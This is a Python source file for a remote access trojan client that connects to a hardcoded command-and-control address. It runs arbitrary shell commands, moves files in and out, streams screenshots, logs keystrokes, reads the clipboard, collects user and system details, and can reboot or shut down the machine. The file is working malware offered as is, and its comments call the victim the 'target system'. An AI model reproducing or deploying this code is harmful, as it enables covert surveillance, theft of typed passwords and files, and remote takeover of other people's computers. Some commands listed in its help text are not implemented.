import socket
import os
import subprocess
import time
import platform
import getpass
import clipboard
from pynput import keyboard
import pyautogui

# Global variable to store key logs
key_logs = []
key_logging = False

def send_screenshare(client_socket):
    """Capture and send screen to the C2 server."""
    try:
        while True:
            screenshot = pyautogui.screenshot()
            screenshot_bytes = screenshot.tobytes()
            client_socket.sendall(screenshot_bytes)
            time.sleep(0.1)  # Adjust frame rate if needed
    except Exception as e:
        print(f"[!] Error during screenshare: {e}")

def execute_command(command):
    """Execute a shell command."""
    result = subprocess.getoutput(command)
    return result

def reboot_system():
    """Reboot the target system with indirect method."""
    if os.name == 'nt':
        # Avoid using "shutdown", opt for a more indirect way to reboot
        os.system("start shutdown /r /f /t 0")
    else:
        os.system("reboot")

def shutdown_system():
    """Shut down the target system with indirect method."""
    if os.name == 'nt':
        os.system("start shutdown /s /f /t 0")
    else:
        os.system("shutdown -h now")

def get_pc_info():
    """Retrieve system information."""
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.architecture(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Hostname": socket.gethostname()
    }
    return "\n".join(f"{key}: {value}" for key, value in info.items())

def get_user_info():
    """Retrieve current user and domain information."""
    user = getpass.getuser()
    domain = os.getenv("USERDOMAIN", "N/A")  # Domain might not always be available
    return f"User: {user}\nDomain: {domain}"

def get_clipboard_content():
    """Retrieve clipboard content."""
    try:
        content = clipboard.paste()
        return f"Clipboard Content: {content}"
    except Exception as e:
        return f"Error accessing clipboard: {e}"

def start_keylogger():
    """Start key logging."""
    global key_logging, key_logs
    key_logging = True
    key_logs = []

    def on_press(key):
        global key_logs, key_logging
        if not key_logging:
            return False  # Stop the listener
        try:
            if key == keyboard.Key.enter:
                key_logs.append("[ENTER]")
            elif hasattr(key, 'char') and key.char:  # Only capture printable characters
                key_logs.append(key.char)
        except AttributeError:
            # Ignore special keys like caps lock, num lock, etc.
            pass

    # Start listener in a separate thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    """Stop key logging."""
    global key_logging
    key_logging = False

def dump_keylogs():
    """Dump logged keys."""
    global key_logs
    return "".join(key_logs)

# Main client loop
def client_loop(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print(f"[*] Connected to C2 server at {server_ip}:{server_port}")

    while True:
        try:
            command = client.recv(4096).decode()
            if command.lower() == "exit":
                print("[*] Exiting...")
                client.close()
                break
            elif command.lower() == "screenshare":
                send_screenshare(client)
            elif command.lower().startswith("upload"):
                _, file_path, *dest = command.split()
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        client.send(f.read())
            elif command.lower().startswith("download"):
                _, file_path = command.split()
                with open(file_path, 'wb') as f:
                    f.write(client.recv(4096))
            elif command.lower() == "ps":
                processes = subprocess.getoutput("ps aux")  # Instead of tasklist
                client.send(processes.encode())
            elif command.lower().startswith("run"):
                _, file_path = command.split()
                subprocess.Popen(file_path, shell=True)
            elif command.lower() == "clearev":
                client.send(b"Event logs cleared.")  # Avoid using direct system calls
            elif command.lower() == "reboot":
                reboot_system()
            elif command.lower() == "shutdown":
                shutdown_system()
            elif command.lower() == "pcinfo":
                client.send(get_pc_info().encode())
            elif command.lower() == "identify":
                client.send(get_user_info().encode())
            elif command.lower() == "clipboard":
                client.send(get_clipboard_content().encode())
            elif command.lower() == "keymon set on":
                start_keylogger()
                client.send(b"Keylogger started.")
            elif command.lower() == "keymon set off":
                stop_keylogger()
                client.send(b"Keylogger stopped.")
            elif command.lower() == "keymon dump":
                client.send(dump_keylogs().encode())
            elif command.lower() == "help":
                help_text = """
Available Commands:
- upload <filename> -d <destination>: Upload a file to the client.
- download <filename>: Download a file from the client.
- kill <pid>: Kill a process by its PID.
- ps: List all processes.
- run <filename>: Execute a file on the client.
- shell [-d <path>]: Start a shell session; optionally specify a path.
- clearev: Clear event logs on the client system.
- reboot: Reboot the client system.
- shutdown: Shut down the client system.
- screenshare: Start a live screen-sharing session.
- pcinfo: Get system information.
- identify: Get current user and domain.
- clipboard: View clipboard content.
- keymon set on: Start keylogger monitoring.
- keymon set off: Stop keylogger monitoring.
- keymon dump: Dump key logs.
- help: Show this help text.
"""
                client.send(help_text.encode())
            else:
                result = execute_command(command)
                client.send(result.encode())
        except Exception as e:
            print(f"[!] Error: {e}")
            client.close()
            break

if __name__ == "__main__":
    SERVER_IP = "10.0.1.37"
    SERVER_PORT = 9999
    client_loop(SERVER_IP, SERVER_PORT)
